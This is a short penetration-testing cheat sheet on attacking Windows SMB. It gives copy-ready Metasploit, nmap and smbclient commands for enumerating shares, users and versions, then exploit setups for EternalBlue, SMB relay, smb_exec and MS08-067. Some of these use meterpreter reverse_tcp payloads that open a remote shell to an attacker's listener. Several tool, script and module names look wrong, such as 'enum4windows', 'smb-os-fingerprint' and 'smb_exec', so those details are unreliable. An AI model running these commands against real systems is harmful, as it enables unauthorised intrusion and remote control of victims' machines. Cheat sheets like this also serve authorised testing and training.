# SMB (Windows)

## Enumeration
- SMB1: Windows 2000, XP, 2003 
- SMB2: Vista SP1, 2008 
- SMB2.1: 7 and 2008 R2 
- SMB3: 8 and Windows 2012 

## Enumeration

### Metasploit

##### smb_enumshares
```bash
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS [IP]
set RPORT 445
run
```

##### smb_version
```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS [IP]
set RPORT 445
run
```

##### smb_enumusers
```bash
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS [IP]
set RPORT 445
run
```

##### netapi
```bash
use auxiliary/scanner/smb/netapi
set RHOSTS [IP]
set RPORT 445
run
```

### Nmap

##### nmap (Samba share enumeration)
```bash
nmap -p 445 --script=smb-enum-shares [IP]
```

##### nmap (Samba version detection)
```bash
nmap -p 445 --script=smb-os-fingerprint [IP]
```

##### nmap (Samba users enumeration)
```bash
nmap -p 445 --script=smb-enum-users [IP]
```

### smbclient

##### smbclient (List shares)
```bash
smbclient -L //[IP] -U guest
```

##### smbclient (Access a share)
```bash
smbclient //[IP]/[SHARE] -U [USER]
```

### enum4windows

##### enum4windows (Basic SMB enumeration)
```bash
enum4windows -a [IP]
```

##### enum4windows (List shares)
```bash
enum4windows -S [IP]
```


---
---


## Exploitation

### Metasploit

##### ms17_010_eternalblue
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [IP]
set RPORT 445
run
```

##### smb_relay
```bash
use exploit/windows/smb/smb_relay
set RHOSTS [IP]
set RPORT 445
set SMBUser [username]
set SMBPass [password]
run
```

##### smb_exec
```bash
use exploit/windows/smb/smb_exec
set RHOSTS [IP]
set RPORT 445
set SMBUser [username]
set SMBPass [password]
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [IP]
set LPORT [port]
run
```

##### ms08_067_netapi
```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS [IP]
set RPORT 445
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [IP]
set LPORT [port]
run
```
